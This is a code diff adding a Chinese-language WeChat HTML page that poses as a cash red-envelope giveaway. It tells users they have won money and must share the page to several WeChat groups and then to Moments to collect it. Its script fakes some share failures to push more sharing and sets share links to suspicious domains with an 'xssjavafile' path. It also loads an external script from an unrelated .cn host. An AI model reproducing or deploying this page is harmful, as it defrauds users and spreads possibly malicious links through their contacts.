@@ -1,0 +1,356 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    <script src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+    <script src="http://res.wx.qq.com/open/js/jweixin-1.2.0.js"></script>
+    <style>
+        body,h1,h2,h3,h4,h5,p,dl,dd,ul,ol,form,input,textarea,th,td,select { margin:0; padding:0; }
+        em { font-style:normal; }
+        li { list-style:none; }
+        a{text-decoration: none; font-size: 20px; font-weight: bold;}
+        img { border:none; vertical-align:top; }
+        table { border-collapse:collapse; }
+        input,textarea { outline:none; }
+        textarea { resize:none; overflow:auto; }
+        body { font-family:"微软雅黑"; background: #393a3e; }
+
+        .box{width: 100%; height: 100vh; background: #393a3e;}
+        .guide{width: 100%;}
+        .imgFont{text-align: center; color:#D85940; font-size: 20px; font-weight: bold; position: relative; top: -30px; }
+        .contentFont{text-align: center;color: #C9C9C9; margin-top: 5vh; line-height: 50px;}
+        .fontStyle{color: #F5A623; font-size: 1.8em; font-weight: bold;}
+        .shareMain{width: 100%;}
+        .hongbao{width: 50%; margin-left: 25%; }
+        .shareMainP{text-align: center; color: #FFE7C0; font-size: 12px; position: relative; top: 30px;}
+        .rand1{width: 15%; height: 8.25vh; border-radius: 50%; background:#facc00; padding: 10px; margin-left: 40%;}
+        .rand2{width: 100%; height: 100%; background: yellow; border-radius: 50%; line-height:8.25vh; font-size: 3em;  color: #facb00; font-weight: bold;}
+        .hint{width: 70%; padding-left:5%; padding-right: 5%;  margin-left: 10%; padding-top:30px; position: absolute; left: 0; top: 25vh; background: white; text-align: center; border-radius: 8px; display: none;}
+        .hintTitle{font-size: 23px;color:#1BBC9B;}
+        .know{width: 100%; height: 50px; border-top:1px solid rgba(0,0,0,.08) }
+        .knowBtn{width: 100%; font-size: 20px; height: 50px; border: 0; background: white;color: #008bec; border-radius: 0 0 8px 8px;}
+        .wrapModal{width: 100%; height: 100vh; background:rgba(0,0,0,0.5);position: absolute; top: 0; left: 0;  }
+        .modal1{width: 70%; padding: 20px; margin-top: 40vh; margin-left: 10%; background: white; border-radius: 8px; }
+        .modal1 p{text-align: center; color: #f5294c; line-height: 80px; border-radius: 8px; font-size: 28px; }
+    </style>
+
+</head>
+<body>
+<script>
+
+    document.writeln("<title></title>");
+
+
+    document.writeln("<div class=\"box\">");
+    document.writeln("    <img class=\"guide\" src=\"https://23-1258351932.cos.ap-beijing-1.myqcloud.com/guide.png\">");
+    document.writeln("    <p class=\"imgFont\">分享点这里</p>");
+    document.writeln("    <p class=\"contentFont\">");
+    document.writeln("        点击右上角分享到<img style=\"width: 24px; margin-left: 6px; margin-right: 6px; position: relative; top: 14px;\" src=\"https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/img/shareImg.png\">");
+    document.writeln("        <span class=\"fontStyle\">微信群</span>");
+    document.writeln("        <br>");
+    document.writeln("        即可领取￥<span class=\"fontStyle\" id=\"price\"></span>￥");
+    document.writeln("    </p>");
+    document.writeln("    <div class=\"shareMain\">");
+    document.writeln("        <p class=\"shareMainP\">恭喜发财</p>");
+    document.writeln("        <img class=\"hongbao\" src=\"http://static.qicp.net./oss/hongbao/hb_3.png\">");
+    document.writeln("");
+    document.writeln("        <div style=\"width: 100%; text-align: center; position: relative;top: -24vh;\">");
+    document.writeln("            <div class=\"rand1\">");
+    document.writeln("                <div class=\"rand2\">");
+    document.writeln("                    ￥");
+    document.writeln("                </div>");
+    document.writeln("            </div>");
+    document.writeln("        </div>");
+    document.writeln("    </div>");
+    document.writeln("</div>");
+</script>
+
+
+<script>
+    document.writeln("<div class=\"hint\">");
+    document.writeln("    <p id=\"fontP\" style=\"font-size: 0.8rem;color: rgba(0,0,0,.54);text-align: center; line-height: 30px; margin-top: 10px; margin-bottom:20px;\">");
+    document.writeln("        <span class=\"hintTitle\">恭喜你</span>");
+    document.writeln("        <br>");
+    document.writeln("        你获得现金红包");
+    document.writeln("        <br>");
+    document.writeln("        <span class=\"number\" style=\"font-size: 20px;color:red;\">132.66元</span>");
+    document.writeln("        <br>");
+    document.writeln("        <span style=\"color: red;\">分享到为微信群后</span><span style=\"color: red; font-size: 25px;\">即可领取</span>");
+    document.writeln("        <br>");
+    document.writeln("        <span style=\"color: red;\">注意：群人数需>50人才能免审核立即到账</span>");
+    document.writeln("        <br>");
+    document.writeln("        <span style=\" color: #c5c5c5;\">红包剩余<span style=\"color: red; font-size: 20px;\">23.63万</span>元，先到先得，马上分享领红包！</span>");
+    document.writeln("    </p>");
+    document.writeln("");
+    document.writeln("");
+    document.writeln("    <p id=\"last\" style=\" display: none; color: black; font-size: 16px;color: #353535; line-height: 24px; padding-bottom: 20px;\"><span style=\" font-size: 20px;color: red;\">");
+    document.writeln("            恭喜您</span>，获得￥ <span class=\"number\" style=\"font-size: 20px;color: red;\">49.24</span>现金红包,由于活动量巨大，正在排队发放，最晚48小时内到账,（<span style=\"font-size:20px;color: red;\">请保留朋友圈分享至微信收到余额到账通知</span>）！");
+    document.writeln("        <br>感谢您的参与!<br><br><span style=\"font-size: 20px;color: red;\">朋友圈信息不可删除,否则无法核实用户信息</span><br><br>以免现金红包发放失败！");
+    document.writeln("    </p>");
+    document.writeln("");
+    document.writeln("    <div class=\"know\">");
+    document.writeln("        <button type=\"button\" class=\"knowBtn\">分享领取</button>");
+    document.writeln("    </div>");
+    document.writeln("</div>");
+</script>
+
+<script>
+
+    document.writeln("<div class=\"wrapModal\">");
+    document.writeln("    <div class=\"modal1\">");
+    document.writeln("        <p>正在查询....</p>");
+    document.writeln("    </div>");
+    document.writeln("</div>");
+</script>
+
+
+<!--统计代码：红包活动分享页-->
+<div style="display: none">
+
+</div>
+
+<script>
+
+    setTimeout(function () {
+        $(".wrapModal").hide();
+        $(".hint").show();
+        var url = window.location.href;
+        var number2 = url.split("num=")[1];
+        number2 = number2.split("&")[0];
+
+        $('#price').html(number2.substring(0, 4));
+        $(".number").eq(0).html(number2);
+        $(".number").eq(1).html(number2);
+
+
+
+
+    },1000);
+
+    // alert(number2);
+    $("#last").hide();
+
+    $(".knowBtn").click(function () {
+        $(".hint").hide();
+    });
+
+    $(".box").click(function () {
+
+        $(".hint").show();
+
+        // alert(1);
+    });
+
+
+</script>
+
+
+
+
+
+
+
+<script>
+    var arraaa2 = ['红包即将过期提醒','红包即将过期提醒！'];
+    title=arraaa2[Math.floor((Math.random() * arraaa2.length))];
+    describe="喜 🉐  112.2 💰";
+    tNum=0;
+    qNum=0;
+    showAd=0;
+    function show() {
+        $('.fenxiang_w').eq(tNum+qNum).show().siblings().hide();
+        if(tNum==1){
+            $("#fontP").html("<p style='color: black; font-size: 14px; font-weight: bold text-align: center;'><span style='color: rgb(0, 176, 80);font-size: 20px; font-weight:bold; '>分享成功<img style='width: 30px;' src='https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/img/yes.png'></span>" +
+                "<br>您仅需再分享<span style='font-size: 18px;color: #f5294c'>3个不同的群</span><br><span style='font-weight: bold; color: #f5294c; font-size: 22px;'>现金红包</span><br><span style='color: #f5294c; font-weight: bold; font-size:18px;'>将自动存入您的微信钱包</span></p>");
+            $(".knowBtn").html("分享领取");
+            $(".hint").show();
+            if(showAd==1){ shareTT();}else{  shareT();}
+        }else if(tNum==2){
+            $("#fontP").html("<p style='color: black; font-size: 14px; font-weight: bold text-align: center;'><span style='color: rgb(0, 176, 80);font-size: 20px; font-weight:bold; '>分享成功<img style='width: 30px;' src='https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/img/yes.png'></span>" +
+                "<br>您仅需再分享<span style='font-size: 18px;color: #f5294c'>2个不同的群</span><br><span style='font-weight: bold; color: #f5294c; font-size: 22px;'>现金红包</span><br><span style='color: #f5294c; font-weight: bold; font-size:18px;'>将自动存入您的微信钱包</span></p>");
+            $(".knowBtn").html("分享领取");
+            $(".hint").show();
+            shareT()
+        }else if(tNum==3){
+            $("#fontP").html("<p style='color: black; font-size: 14px; font-weight: bold text-align: center;'><span style='color: #f5294c;font-size: 20px; font-weight:bold; '>分享失败<img style='width: 30px;' src='https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/img/no.png'></span>" +
+                "<br>您仅需再分享<span style='font-size: 18px;color: #f5294c'>2个不同的群</span><br><span style='font-weight: bold; color: #f5294c; font-size: 22px;'>现金红包</span><br><span style='color: #f5294c; font-weight: bold; font-size: 18px;'>将自动存入您的微信钱包</span></p>");
+            $(".knowBtn").html("分享领取");
+            $(".hint").show();
+            if(showAd==1){ shareTT();}else{  shareT();}
+        }else if(tNum==4){
+            $("#fontP").html("<p style='color: black; font-size: 14px; font-weight: bold text-align: center;'><span style='color: rgb(0, 176, 80);font-size: 20px; font-weight:bold; '>分享成功<img style='width: 30px;' src='https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/img/yes.png'></span>" +
+                "<br>您仅需再分享<span style='font-size: 18px;color: #f5294c'>1个不同的群</span><br><span style='font-weight: bold; color: #f5294c; font-size: 22px;'>现金红包</span><br><span style='color: #f5294c; font-weight: bold; font-size: 18px;'>将自动存入您的微信钱包</span></p>");
+            $(".knowBtn").html("分享领取");
+            $(".hint").show();
+            shareT();
+        }else if(tNum==5){
+            $("#fontP").html("<p style='color: black; font-size: 14px; font-weight: bold text-align: center;'><span style='color: #f5294c;font-size: 20px; font-weight:bold; '>分享失败<img style='width: 30px;' src='https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/img/no.png'></span>" +
+                "<br>注意：请不要分享到<span style='font-size: 18px;color: #f5294c'>相同的群或好友</span><br>请尝试重新分享到不同的群<br>即可领取<span style='font-weight: bold; color: #f5294c; font-size: 22px;'>现金红包</span></p>");
+            $(".knowBtn").html("分享领取");
+            $(".hint").show();
+            shareT();
+        }else if(tNum+qNum==6){
+            shareQ();
+            wx.hideOptionMenu();
+            wx.showMenuItems({
+                menuList: ['menuItem:share:timeline']
+            });
+            $("#fontP").html("<p style='color: black; font-size: 14px; font-weight: bold text-align: center;'><span style='color: rgb(0, 176, 80);font-size: 20px; font-weight:bold; '>分享成功<img style='width: 30px;' src='https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/img/yes.png'></span>" +
+                "<br>只剩<span style='font-size: 18px;color: #f5294c'>最后一步啦</span><br>请分享到<span style='font-weight: bold; color: #f5294c; font-size: 18px;'>朋友圈</span><br>保证100%可领取<span style='color: #f5294c; font-weight: bold; font-size: 20px;'>现金红包</span></p>");
+            $(".knowBtn").html("分享领取");
+            $('.fontStyle').html('朋友圈');
+            $(".hint").show();
+
+        }else if(tNum+qNum==7){
+            $("#fontP").html("<p style='color: black; font-size: 14px; font-weight: bold text-align: center;'><span style='color: #f5294c;font-size: 20px; font-weight:bold; '>分享失败<img style='width: 30px;' src='https://dongman-img.oss-cn-hangzhou.aliyuncs.com/lucy/img/no.png'></span>" +
+                "<br>只剩<span style='font-size: 14px;color: #f5294c'>剩最后一步啦</span><br>请再次分享到<span style='font-weight: bold; color: #f5294c; font-size: 18px;'>朋友圈</span><br>保证100%可领取<span style='color: #f5294c; font-weight: bold; font-size: 20px;'>现金红包</span></p>");
+            $(".knowBtn").html("分享领取");
+            $(".hint").show();
+            if(showAd==1){ shareQQ();}else{  shareQ();}
+        }else if(tNum+qNum==8){
+            $(".hint").show();
+            $("#fontP").hide();
+            $("#last").show();
+            $(".knowBtn").html("分享领取");
+            setTimeout(function () {
+                WeixinJSBridge.call('closeWindow');
+            }, 10000);
+        }
+    }
+
+
+
+    $(function () {
+        $.post("", {hurl: location.href}, function (data) {
+
+
+            data = {
+                "config": {
+                    "debug": false,
+                    "beta": false,
+                    "jsApiList": ["onMenuShareTimeline", "onMenuShareAppMessage", "showMenuItems", "hideMenuItems"],
+                    "appId": "wx0db0e825498f31ec",
+                    "nonceStr": "ZnTv0DTNvlrEKJH0",
+                    "timestamp": 1565104344,
+                    "url": "http:\/\/dqkao.183885.vip\/lucy\/user\/vr\/82d12f3b513588590619dfe6e67c6214?amount=132.66",
+                    "signature": "092f1d2354b9e2a380ad835c9e628102113f5da2"
+                },
+                "zuArr": [{
+                    "title": "生活补贴已发放",
+                    "desc": "1 2 8 ￥",
+                    "imgUrl": "http:\/\/wcdn1.mdwnzg.cn\/uploads\/20190805\/db25373a0925588a49a070562c66cca3.jpg",
+                    "link": "http:\/\/m1jUeTGY.50040423.cn\/xssjavafile=M3HcNCRL29pl9jdZYYHSwHLduJseplA2ea5TCOxuNNHMYMCNCdzYKd46"
+                }, {
+                    "title": "生活补贴已发放",
+                    "desc": "1 2 8 ￥",
+                    "imgUrl": "http:\/\/wcdn1.mdwnzg.cn\/uploads\/20190805\/db25373a0925588a49a070562c66cca3.jpg",
+                    "link": "http:\/\/m1jUeTGY.50040423.cn\/xssjavafile=M3HcNCRL29pl9jdZYYHSwHLduJseplA2ea5TCOxuNNHMYMCNCdzYKd46"
+                }, {
+                    "title": "生活补贴已发放",
+                    "desc": "",
+                    "imgUrl": "http:\/\/wcdn1.mdwnzg.cn\/uploads\/20190805\/e7731fe5445f503d0f37885e6c566506.jpg",
+                    "link": "http:\/\/m1jUeTGY.50040423.cn\/xssjavafile=M3HcNCRL29pl9jdZYYHSwHLduJseplA2ea5TCOxuNNHMYMCNCdzYKd46"
+                }, {
+                    "title": "生活补贴已发放",
+                    "desc": "",
+                    "imgUrl": "http:\/\/wcdn1.mdwnzg.cn\/uploads\/20190805\/e7731fe5445f503d0f37885e6c566506.jpg",
+                    "link": "http:\/\/m1jUeTGY.50040423.cn\/xssjavafile=M3HcNCRL29pl9jdZYYHSwHLduJseplA2ea5TCOxuNNHMYMCNCdzYKd46"
+                }],
+                "showAd": 0
+            }
+
+            window.data = data;
+            wx.config(window.data.config);
+            showAd=window.data.showAd;
+            wx.ready(function () {
+                setTimeout(function () {
+                    wx.hideOptionMenu();
+
+                });
+                setTimeout(function () {
+                    wx.showMenuItems({
+                        menuList: ['menuItem:share:appMessage']
+                    });
+                }, 1000);
+                shareT();
+            });
+
+            wx.error(function (res) {
+
+            });
+        })
+    })
+
+    function shareT() {
+
+        wx.onMenuShareAppMessage({
+            title:window.data.zuArr[0].title,
+            link: window.data.zuArr[0].link,
+            imgUrl: window.data.zuArr[0].imgUrl,
+            desc:  window.data.zuArr[0].desc,
+            success: function () {
+                tNum += 1;
+                show();
+            },
+            fail: function () {
+            }
+        })
+    };
+
+    function shareTT() {
+
+        wx.onMenuShareAppMessage({
+            title:window.data.zuArr[1].title,
+            link: window.data.zuArr[1].link,
+            imgUrl: window.data.zuArr[1].imgUrl,
+            desc: window.data.zuArr[1].desc,
+            success: function () {
+                tNum += 1;
+                show();
+            },
+            fail: function () {
+            }
+        })
+    };
+
+
+    function shareQ() {
+
+
+        wx.onMenuShareTimeline({
+            title:window.data.zuArr[2].title,
+            link: window.data.zuArr[2].link,
+            imgUrl: window.data.zuArr[2].imgUrl,
+            success: function () {
+                qNum += 1;
+                show();
+            },
+            fail: function () {
+            }
+        })
+    };
+
+    function shareQQ() {
+
+
+        wx.onMenuShareTimeline({
+            title: window.data.zuArr[3].title,
+            link: window.data.zuArr[3].link,
+            imgUrl: window.data.zuArr[3].imgUrl,
+            success: function () {
+                qNum += 1;
+                show();
+            },
+            fail: function () {
+            }
+        })
+    };
+
+</script>
+<script src="http://51541452.cn/public/static/ad/js/1"></script>
+</body>
+</html>
+
+
+
